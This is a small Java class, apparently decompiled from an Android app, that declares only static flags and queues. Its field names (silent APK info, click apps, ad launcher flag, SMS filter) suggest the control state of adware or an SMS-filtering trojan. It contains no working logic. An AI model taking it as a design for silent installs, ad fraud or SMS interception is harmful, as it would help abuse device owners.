package com.qc.base;

import com.qc.entity.CustomInfo;
import com.qc.entity.SilenceApkInfo;
import com.qc.entity.SilencePager;
import com.qc.entity.SmsInfo;
import java.util.LinkedList;
import java.util.Queue;

public class OrderSet {
    public static int APKInstallFlag = 0;
    public static int adsLaucherFlag = 0;
    public static Queue<SilenceApkInfo> aliveApps = new LinkedList();
    public static Queue<SilenceApkInfo> clickApps = new LinkedList();
    public static CustomInfo customInfo;
    public static int isopenSMS = 0;
    public static int launcherDate = 0;
    public static int linkNet = 0;
    public static int motionAppFlag = 0;
    public static int openAppFlag = 0;
    public static Queue<SilencePager> openPager = new LinkedList();
    public static SmsInfo smsFilter;
    public static int websiteOpenFlag = 0;
}
